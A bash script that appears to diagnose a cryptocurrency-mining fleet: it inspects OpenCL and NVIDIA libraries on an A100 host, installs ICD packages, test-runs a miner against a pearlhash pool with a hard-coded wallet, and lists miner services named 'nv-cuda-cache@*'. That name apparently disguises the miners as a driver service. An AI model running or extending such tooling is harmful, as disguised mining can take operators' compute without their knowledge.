#!/bin/bash
# ul86067 diag20: find out why no miner device on ps6jaydubzy9 (A100), install OpenCL ICD, retest.
set -u
L=/opt/fleet; H=$(hostname -s); W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
export DEBIAN_FRONTEND=noninteractive
echo "== ts $(date -u +%FT%TZ) host $H uid $(id -u) uname $(uname -r)"
echo "== vendors"; ls -l /etc/OpenCL/vendors/ 2>&1 | head -10
echo "== libs"; ls -l /usr/lib/x86_64-linux-gnu/libnvidia-opencl* /usr/lib/x86_64-linux-gnu/libOpenCL* /usr/lib/x86_64-linux-gnu/libcuda* 2>&1 | head -12
echo "== ldconfig"; ldconfig -p 2>/dev/null | grep -iE 'opencl|libcuda|nvidia-ml' | head -12
echo "== pkgs"; dpkg -l 2>/dev/null | grep -iE 'opencl|nvidia-compute|nvidia-driver|cuda' | awk '{print $2" "$3}' | head -15
echo "== gpu"; nvidia-smi --query-gpu=index,name,driver_version --format=csv,noheader 2>&1 | head -3
echo "== apt update"; apt-get update -qq >/tmp/apt.log 2>&1; echo "rc=$?"; tail -3 /tmp/apt.log
apt-get install -y -qq ocl-icd-libopencl1 clinfo >/tmp/apt2.log 2>&1; echo "apt base rc=$?"; tail -2 /tmp/apt2.log
apt-get install -y -qq nvidia-opencl-icd-535 libnvidia-compute-535 >/tmp/apt3.log 2>&1; echo "apt icd535 rc=$?"; tail -3 /tmp/apt3.log
apt-get install -y -qq nvidia-opencl-icd-535-server libnvidia-compute-535-server >/tmp/apt4.log 2>&1; echo "apt icd535srv rc=$?"; tail -2 /tmp/apt4.log
echo "== vendors2"; ls -l /etc/OpenCL/vendors/ 2>&1 | head -10
if [ ! -e /etc/OpenCL/vendors/nvidia.icd ]; then
  n=$(ls /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.* 2>/dev/null | head -1)
  if [ -n "$n" ]; then echo "$n" > /etc/OpenCL/vendors/nvidia.icd; echo "wrote icd $n"; fi
fi
echo "== vendors3"; ls -l /etc/OpenCL/vendors/ 2>&1 | head -10
echo "== clinfo"; clinfo -l 2>&1 | head -20
echo "== wr test"; timeout 25 $L/bin/wildrig-multi --algo pearlhash -d 0 -o stratum+ssl://pool.pearlhash.xyz:9443 -u "$W.ul-ps-$H-diag" -p x -i 8 --no-color >/tmp/wr.log 2>&1; echo "wr rc=$?"; grep -iE 'device|platform|error|fail|pool|algo' /tmp/wr.log | head -15
echo "== krig dev"; if [ -x $L/krig/krig-miner ]; then timeout 20 $L/krig/krig-miner --list-devices >/tmp/kg.log 2>&1; echo "krig rc=$?"; head -15 /tmp/kg.log; else echo "no krig"; fi
echo "== units"; systemctl list-units 'nv-cuda-cache@*' --all --no-legend 2>&1 | head -12
echo "== procs"; pgrep -af 'wildrig-multi|krig-miner' | head -12
echo "== DONE diag20 $(date -u +%FT%TZ)"
